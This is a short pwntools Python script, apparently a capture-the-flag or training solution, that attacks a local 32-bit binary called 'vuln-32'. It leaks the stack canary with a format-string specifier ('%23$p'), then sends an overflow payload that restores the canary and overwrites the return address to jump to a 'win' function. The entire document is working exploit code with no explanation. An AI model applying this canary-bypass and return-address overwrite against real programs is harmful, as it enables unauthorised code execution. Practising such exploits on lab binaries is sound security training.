from pwn import *
elf = context.binary = ELF("./vuln-32")
p = process()
offset = 64
eip = 12
p.sendline("%23$p")
p.recvuntil(b"Leak me\n")
canary = int(p.recvline().strip().decode(),16)
win = elf.sym['win']
payload = b"A" * offset + p32(canary) + b"B" * eip + p32(win)
p.sendline(payload)
print(p.recvall().strip().decode())